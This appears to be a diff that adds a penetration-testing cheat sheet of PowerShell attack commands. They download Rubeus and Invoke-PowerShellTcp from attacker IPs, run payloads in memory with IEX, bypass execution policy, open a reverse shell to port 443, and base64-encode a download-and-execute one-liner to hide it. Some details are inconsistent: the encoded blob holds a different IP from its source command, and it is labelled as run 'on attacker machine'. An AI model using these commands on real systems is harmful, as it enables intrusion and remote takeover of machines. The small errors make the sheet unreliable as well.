@@ -1,1 +1,31 @@
+iwr -uri http://192.168.45.x/Rubeus.exe -outfile C:\Windows\temp\Rubeus.exe
+
+# Does not save file on the system
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file_name>')"
+
+# Saves file on the system
+powershell.exe -nop -ep bypass -c "iwr -uri http://<ip>/<file_name> -outfile path/to/save/file_name"
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://<ip>/<file_name>','path/to/save/file_name')"
+
+Powershell
+Download
+$ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.x/Invoke-PowerShellTcp.ps1', 'C:\Invoke-PowerShellTcp.ps1')
+
+Run
+$ Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.119.x -Port 443
+
+Execute exe
+$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Invoke-PowerShellTcp.ps1
+
+Download and execute immediately
+$ powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.x/Invoke-PowerShellTcp.ps1')
+$ powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.x/Invoke-PowerShellTcp.ps1')
+
+
+base64 encoding to avoid badchars or to obfuscate:
+in linux:
+$ echo "powershell.exe -c 'IEX(IWR http://192.168.1.x/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
+result = a base64 blob.
+Then run on attacker machine:
+$ powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
 
